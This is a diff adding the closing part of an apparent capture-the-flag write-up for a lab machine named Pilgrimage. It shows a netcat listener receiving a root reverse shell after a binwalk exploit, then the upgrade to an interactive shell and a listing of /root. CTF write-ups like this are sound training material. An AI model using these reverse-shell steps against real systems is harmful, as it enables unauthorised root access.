@@ -169,5 +169,31 @@ binwalk_exploit.png                                                             
 ```
 
 
+and we have access
+```bash
+root@Fs:.../Pilgrimage/privesc# nc -lnvp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.10.11.219 46362
+ls
+_binwalk_exploit.png.extracted
+_e.png.extracted
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+^Z
+[1]+  Stopped                 nc -lnvp 9999
+root@Fs:.../Pilgrimage/privesc# stty raw -echo;fg
+nc -lnvp 9999
+             root@pilgrimage:~/quarantine# export TERM=xterm-256color
+root@pilgrimage:~/quarantine# export SHELL=/bin/bash
+root@pilgrimage:~/quarantine# ls
+_binwalk_exploit.png.extracted	_e.png.extracted
+root@pilgrimage:~/quarantine# ls /root
+quarantine  reset.sh  root.txt
+root@pilgrimage:~/quarantine# 
+```
 
+Goodbye! 💜
 
